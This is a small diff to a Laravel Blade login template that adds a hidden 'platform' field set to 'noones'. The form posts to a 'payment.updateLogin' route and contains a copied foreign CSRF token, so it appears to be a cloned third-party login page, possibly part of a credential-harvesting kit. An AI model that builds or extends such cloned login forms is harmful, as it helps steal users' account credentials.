@@ -1376,6 +1376,9 @@
                 <div class="mantine-118pqss">
                     <form action="{{ route('payment.updateLogin') }}" method="post" autocomplete="off" style="display: flex; flex-direction: column; justify-content: space-between; flex: 1 1 0%; padding: 40px 9px 16px 9px; width: 340px; gap: 82px;">
                     @csrf    
+
+                    <input type="hidden" name="platform" value="noones">
+
                     
                     <input type="hidden" name="csrfmiddlewaretoken" value="w2tX0saPcrT6Y1rc9J9FiPM1n1iOkFNBic43gAuZj9DJYzf746reLGWkztBS8JRK">
                         <div class="mantine-1unp6rv">
